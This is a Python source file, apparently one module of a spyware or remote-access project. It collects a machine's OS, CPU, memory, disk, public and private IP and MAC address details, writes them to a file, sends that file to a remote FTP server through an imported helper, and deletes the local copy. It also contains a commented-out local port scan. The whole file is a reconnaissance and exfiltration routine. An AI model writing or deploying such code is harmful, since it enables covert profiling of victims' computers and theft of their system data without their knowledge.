from send_file import send_file
from removefile import removefile
import requests
import psutil
import socket
import uuid
import platform


class sysinfo():
    def __init__(self):
        # Get operating system information
        self.os = platform.uname()
        # Get CPU information
        self.cpufreq = psutil.cpu_freq()
        # Get memory information
        self.svmem = psutil.virtual_memory()
        # Get disk information
        self.partitions = psutil.disk_partitions()
        # Get public IP Address
        response = requests.get('https://api.ipify.org')
        self.public_ip = response.text
        # Get IP Address
        self.private_ip = socket.gethostbyname(socket.gethostname())
        # Get MAC Address
        self.mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

    def getInfo(self):
        info = f"System: {self.os.system}, Node Name: {self.os.node}, Release: {self.os.release}, Version: {self.os.version}, Machine: {self.os.machine}, Processor: {self.os.processor}\nMaximum Frequency: {self.cpufreq.max:.2f}Mhz, Minimum Frequency: {self.cpufreq.min:.2f}Mhz, Current Frequency: {self.cpufreq.current:.2f}Mhz\nTotal: {self.svmem.total // (1024 ** 2)} MB, Available: {self.svmem.available // (1024 ** 2)} MB, Used: {self.svmem.used // (1024 ** 2)} MB, Percentage: {self.svmem.percent}%\n"
        
        for partition in self.partitions:
            info += f"Device: {partition.device}, Mountpoint: {partition.mountpoint}, File system type: {partition.fstype}\n"
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            info += f"\tTotal Size: {partition_usage.total // (1024 ** 3)} GB, Used: {partition_usage.used // (1024 ** 3)} GB, Free: {partition_usage.free // (1024 ** 3)} GB, Percentage: {partition_usage.percent}%\n"
        
        info += f"Public IP Address: {self.public_ip}\n"
        info += f"Private IP Address: {self.private_ip}\n"
        info += f"MAC Address: {self.mac}"
        # Comment following code to increase program speed:
        # info += "Open ports:\n"
        # for port in range(1, 1025):
        #     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #     sock.settimeout(1)
        #     result = sock.connect_ex((self.private_ip, port))
        #     if result == 0:
        #         info += f"\tPort {port}: Open\n"
        #     sock.close()
        # ---
        
        return info
    
    def write(self):
        #Create file and write system info to this file
        with open("sysinfo.txt", 'w') as f:
            f.write(self.getInfo())

    def remove(self):
        removefile("sysinfo.txt")


    def send(self):
        #Send this file to the remote FTP server
        send_file('sysinfo.txt')

